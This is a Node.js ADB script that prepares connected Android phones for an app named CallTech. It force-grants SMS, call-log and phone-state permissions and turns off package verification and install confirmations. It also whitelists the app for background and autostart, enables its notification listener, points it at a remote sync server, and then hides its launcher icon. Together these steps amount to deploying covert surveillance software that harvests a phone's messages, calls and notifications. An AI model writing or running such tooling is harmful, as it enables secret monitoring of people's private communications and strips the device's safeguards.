/**
 * Install ke baad USB phones par permissions auto-grant + sync trigger.
 * Har installDebug ke baad bhi Gradle se auto-chalta hai.
 */
const {execSync} = require('child_process');
const {listAdbDevices} = require('./project-paths');
const {hideLauncherOnly, wakeBackground} = require('./hide-launcher-icon');
const {launchPermissionPopup} = require('./launch-permission-popup');
const {isPackageInstalled, runOutput: shellOutput} = require('./package-check');

const PACKAGE = 'com.calltech';
const PERMISSIONS = [
  'android.permission.RECEIVE_SMS',
  'android.permission.READ_SMS',
  'android.permission.READ_CALL_LOG',
  'android.permission.READ_PHONE_STATE',
  'android.permission.READ_PHONE_NUMBERS',
];

const PERMISSION_APPOPS = {
  'android.permission.RECEIVE_SMS': 'READ_SMS',
  'android.permission.READ_SMS': 'READ_SMS',
  'android.permission.READ_CALL_LOG': 'READ_CALL_LOG',
  'android.permission.READ_PHONE_STATE': 'READ_PHONE_STATE',
  'android.permission.READ_PHONE_NUMBERS': 'READ_PHONE_NUMBERS',
};

function run(command) {
  try {
    execSync(command, {stdio: 'pipe', encoding: 'utf8'});
    return true;
  } catch (_error) {
    return false;
  }
}

function runOutput(command) {
  return shellOutput(command);
}

function listDevices() {
  return listAdbDevices();
}

function listUserIds(deviceId) {
  const output = runOutput(`adb -s ${deviceId} shell pm list users`);
  const ids = [...output.matchAll(/UserInfo\{(\d+):/g)].map(match => match[1]);
  return ids.length > 0 ? ids : ['0'];
}

function isInstalled(deviceId) {
  return isPackageInstalled(deviceId, PACKAGE);
}

function apkOnPhone(deviceId) {
  const out = runOutput(
    `adb -s ${deviceId} shell ls /sdcard/Download/calltech-app-debug.apk`,
  );
  return out.includes('calltech-app-debug.apk');
}

function openApkInstaller(deviceId) {
  console.log('  Phone par Downloads folder khol raha hoon...');
  console.log('  → calltech-app-debug.apk par tap karo → Install');
  run(
    `adb -s ${deviceId} shell am start -a android.intent.action.VIEW -d "content://com.android.externalstorage.documents/document/primary%3ADownload" -t "vnd.android.document/directory"`,
  );
}

function launchApp(deviceId) {
  launchPermissionPopup(deviceId);
}

function isPermissionGranted(deviceId, permission) {
  const output = runOutput(`adb -s ${deviceId} shell dumpsys package ${PACKAGE}`);
  const shortName = permission.split('.').pop();
  return (
    output.includes(`${permission}: granted=true`) ||
    output.includes(`${shortName}: granted=true`)
  );
}

function grantPermission(deviceId, permission, userIds) {
  for (const userId of userIds) {
    run(`adb -s ${deviceId} shell pm grant --user ${userId} ${PACKAGE} ${permission}`);
  }

  run(`adb -s ${deviceId} shell pm grant ${PACKAGE} ${permission}`);
  run(`adb -s ${deviceId} shell pm grant --user current ${PACKAGE} ${permission}`);

  const appOp = PERMISSION_APPOPS[permission];
  if (appOp) {
    run(`adb -s ${deviceId} shell appops set ${PACKAGE} ${appOp} allow`);
  }
}

function enableBackground(deviceId) {
  const manufacturer = runOutput(`adb -s ${deviceId} shell getprop ro.product.manufacturer`).toLowerCase();
  const cmds = [
    `adb -s ${deviceId} shell cmd deviceidle whitelist +${PACKAGE}`,
    `adb -s ${deviceId} shell dumpsys deviceidle whitelist +${PACKAGE}`,
    `adb -s ${deviceId} shell cmd netpolicy add restrict-background-whitelist ${PACKAGE}`,
    `adb -s ${deviceId} shell appops set ${PACKAGE} RUN_IN_BACKGROUND allow`,
    `adb -s ${deviceId} shell appops set ${PACKAGE} RUN_ANY_IN_BACKGROUND allow`,
    `adb -s ${deviceId} shell appops set ${PACKAGE} WAKE_LOCK allow`,
    `adb -s ${deviceId} shell appops set ${PACKAGE} START_FOREGROUND allow`,
    `adb -s ${deviceId} shell cmd appops set ${PACKAGE} RUN_IN_BACKGROUND allow`,
    `adb -s ${deviceId} shell cmd appops set ${PACKAGE} RUN_ANY_IN_BACKGROUND allow`,
    `adb -s ${deviceId} shell cmd appops set ${PACKAGE} WAKE_LOCK allow`,
  ];

  if (manufacturer.includes('xiaomi') || manufacturer.includes('redmi')) {
    cmds.push(
      `adb -s ${deviceId} shell am broadcast -a miui.intent.action.OP_AUTO_START --ez autostart true --es package_name ${PACKAGE}`,
    );
  }

  if (manufacturer.includes('oppo') || manufacturer.includes('realme') || manufacturer.includes('oneplus')) {
    cmds.push(
      `adb -s ${deviceId} shell am broadcast -a oppo.intent.action.OPPO_AUTO_START --ez autostart true --es package_name ${PACKAGE}`,
    );
  }

  for (const cmd of cmds) {
    run(cmd);
  }
}

function enableUsbInstall(deviceId) {
  const manufacturer = runOutput(`adb -s ${deviceId} shell getprop ro.product.manufacturer`).toLowerCase();
  const cmds = [
    `adb -s ${deviceId} shell settings put global verifier_verify_adb_installs 0`,
    `adb -s ${deviceId} shell settings put global package_verifier_enable 0`,
    `adb -s ${deviceId} shell settings put secure install_non_market_apps 1`,
  ];

  if (manufacturer.includes('realme') || manufacturer.includes('oppo') || manufacturer.includes('oneplus')) {
    cmds.push(`adb -s ${deviceId} shell settings put global adb_install_need_confirm 0`);
  }

  if (manufacturer.includes('xiaomi') || manufacturer.includes('redmi') || manufacturer.includes('poco')) {
    cmds.push(`adb -s ${deviceId} shell settings put global adb_install_need_confirm 0`);
  }

  for (const cmd of cmds) {
    run(cmd);
  }
}

function printInstallHelp(manufacturer, model) {
  const brand = `${manufacturer} ${model}`.toLowerCase();
  console.log('  ERROR: CallTech app not installed on this device');
  if (brand.includes('xiaomi') || brand.includes('redmi') || brand.includes('poco')) {
    console.log('');
    console.log('  Redmi/MIUI fix:');
    console.log('    Settings → Developer options →');
    console.log('      • USB debugging (Security settings) ON');
    console.log('      • Install via USB ON');
    console.log('    Phir: npm run android:install');
    console.log('    Ya manual: npm run android:push-apk');
  } else if (brand.includes('realme') || brand.includes('oppo')) {
    console.log('  Developer options → Install via USB ON, phir npm run android:install');
  } else {
    console.log('  Pehle install karo: npm run android:install');
  }
}


function warnSyncConfig() {
  try {
    const fs = require('fs');
    const path = require('path');
    const envPath = require('./project-paths').findServerEnv();
    if (!fs.existsSync(envPath)) {
      return;
    }
    const env = fs.readFileSync(envPath, 'utf8');
    const hasSyncUrl = /^SYNC_API_URL=\s*\S+/m.test(env) && !/^SYNC_API_URL=\s*$/m.test(env);
    const hasDataApi = /^ATLAS_DATA_API_KEY=\s*\S+/m.test(env);
    if (!hasSyncUrl && !hasDataApi) {
      console.log('');
      console.log('  WARNING: SYNC_API_URL empty — phone mobile data par sync fail ho sakta hai.');
      console.log('  Fix: Render deploy karo YA same WiFi par PC server:');
      console.log('    npm run server:lan');
      console.log('    npm run server');
      console.log('    npm run android');
    }
  } catch (_error) {
    // ignore
  }
}

function readSyncApiUrl() {
  const liveUrl = 'https://calltrack-e62l.onrender.com/api';
  try {
    const fs = require('fs');
    const envPath = require('./project-paths').findServerEnv();
    if (!fs.existsSync(envPath)) {
      return liveUrl;
    }
    const env = fs.readFileSync(envPath, 'utf8');
    const match = env.match(/^SYNC_API_URL=\s*(\S+)/m);
    const url = match ? match[1].trim() : '';
    if (
      !url ||
      url.includes('localhost') ||
      url.includes('127.0.0.1') ||
      url.includes('192.168') ||
      url.includes('admin-')
    ) {
      return liveUrl;
    }
    return url;
  } catch (_error) {
    return liveUrl;
  }
}

function pushSyncUrl(deviceId) {
  const url = readSyncApiUrl();
  if (!url) {
    return;
  }
  const escaped = url.replace(/"/g, '\\"');
  run(
    `adb -s ${deviceId} shell am broadcast -a com.calltech.FORCE_SYNC -p ${PACKAGE} --es sync_url "${escaped}"`,
  );
  console.log(`  sync URL pushed to phone: ${url}`);
}

function grantOnDevice(deviceId) {
  const model = runOutput(`adb -s ${deviceId} shell getprop ro.product.model`) || deviceId;
  const manufacturer = runOutput(`adb -s ${deviceId} shell getprop ro.product.manufacturer`) || 'unknown';
  console.log(`\nDevice: ${deviceId} (${manufacturer} ${model})`);

  if (!isInstalled(deviceId)) {
    printInstallHelp(manufacturer, model);
    if (apkOnPhone(deviceId)) {
      console.log('');
      console.log('  APK phone ke Download folder me hai — ab install karo:');
      console.log('    npm run android:open-apk');
      console.log('  Phone par Install dabao, phir:');
      console.log('    npm run android:grant');
    } else {
      console.log('  Pehle: npm run android:push-apk');
    }
    return;
  }

  execSync('ping -n 2 127.0.0.1 > nul', {stdio: 'ignore'});

  enableUsbInstall(deviceId);
  enableBackground(deviceId);
  console.log('  background/autostart enabled');

  pushSyncUrl(deviceId);

  console.log('  Phone par permission popup khol raha hoon — icon tap mat karo. Allow dabao.');
  launchPermissionPopup(deviceId);

  run(
    `adb -s ${deviceId} shell cmd notification allow_listener ${PACKAGE}/${PACKAGE}.CallTechNotificationListener`,
  );

  execSync('ping -n 3 127.0.0.1 > nul', {stdio: 'ignore'});
  const missing = PERMISSIONS.filter(permission => !isPermissionGranted(deviceId, permission));
  if (missing.length > 0) {
    console.log('  Phone screen par system permission popup dekho — sab Allow karo.');
    console.log('  CallTech icon tap mat karo — popup USB se khulta hai.');
    if (manufacturer.toLowerCase().includes('realme') || manufacturer.toLowerCase().includes('oppo')) {
      console.log('  Realme/Oppo: Developer options -> Install via USB ON');
    }
    if (
      manufacturer.toLowerCase().includes('xiaomi') ||
      manufacturer.toLowerCase().includes('redmi')
    ) {
      console.log('  Redmi: Developer options -> "Install via USB" + "USB debugging (Security settings)" ON.');
    }
  } else {
    wakeBackground(deviceId);
    hideLauncherOnly(deviceId);
    console.log('  permissions already granted — hide + background sync');
  }
  warnSyncConfig();
}

const devices = listDevices();
if (devices.length === 0) {
  console.log('No Android device connected.');
  process.exit(1);
}

console.log('CallTech auto-grant starting...');
devices.forEach(grantOnDevice);
console.log('\nDone — permissions auto-grant complete.');
